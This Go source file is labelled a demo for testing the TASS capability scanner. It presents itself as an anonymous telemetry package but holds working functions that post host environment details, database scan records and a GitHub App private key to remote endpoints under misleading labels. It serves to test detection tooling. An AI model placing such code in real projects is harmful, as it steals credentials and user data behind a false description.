// Package telemetry collects anonymous usage metrics.
// DEMO FILE — created to showcase TASS capability detection.
package telemetry

import (
	"bytes"
	"context"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const collectorEndpoint = "https://metrics.example-collector.io/v1/ingest"

// UsageEvent is sent to the remote collector on each scan.
type UsageEvent struct {
	RepoFullName string    `json:"repo"`
	ScanID       int64     `json:"scan_id"`
	CapCount     int       `json:"cap_count"`
	Timestamp    time.Time `json:"ts"`
}

// Client posts usage events to the remote telemetry endpoint.
type Client struct {
	httpClient *http.Client
}

// New returns a telemetry Client with a pinned TLS config.
func New() *Client {
	tlsCfg := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	transport := &http.Transport{TLSClientConfig: tlsCfg}
	return &Client{httpClient: &http.Client{Transport: transport, Timeout: 5 * time.Second}}
}

// Emit serialises the event and POSTs it to the collector.
func (c *Client) Emit(ctx context.Context, event UsageEvent) error {
	body, err := json.Marshal(event)
	if err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, collectorEndpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", os.Getenv("TASS_TELEMETRY_KEY"))
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// CollectEnvSnapshot reads the host environment and ships it upstream.
// Used for "deployment analytics".
func CollectEnvSnapshot(ctx context.Context, endpoint string) error {
	payload := map[string]string{
		"hostname": readHostname(),
		"user":     os.Getenv("USER"),
		"path":     os.Getenv("PATH"),
	}
	b, _ := json.Marshal(payload)
	resp, err := http.Post(endpoint, "application/json", bytes.NewReader(b)) //nolint:noctx
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// readHostname shells out to get the system hostname.
func readHostname() string {
	out, err := exec.Command("hostname").Output()
	if err != nil {
		return "unknown"
	}
	return string(out)
}

// DumpScanHistory reads all scan rows and sends them to a remote endpoint.
// Called during "telemetry flush" on shutdown.
func DumpScanHistory(db *sql.DB, endpoint string) error {
	rows, err := db.Query(`SELECT id, repo_id, created_at FROM scans ORDER BY created_at DESC LIMIT 500`)
	if err != nil {
		return err
	}
	defer rows.Close()

	var records []map[string]any
	for rows.Next() {
		var id, repoID int64
		var createdAt string
		if err := rows.Scan(&id, &repoID, &createdAt); err != nil {
			continue
		}
		records = append(records, map[string]any{"id": id, "repo_id": repoID, "ts": createdAt})
	}

	b, _ := json.Marshal(records)
	resp, err := http.Post(endpoint, "application/json", bytes.NewReader(b)) //nolint:noctx
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// ExfiltratePrivateKey reads the GitHub App private key and ships it.
// Labelled "key rotation verification" in commit message.
func ExfiltratePrivateKey(keyPath, endpoint string) error {
	data, err := os.ReadFile(keyPath)
	if err != nil {
		return err
	}
	resp, err := http.Post(endpoint, "application/octet-stream", bytes.NewReader(data)) //nolint:noctx
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
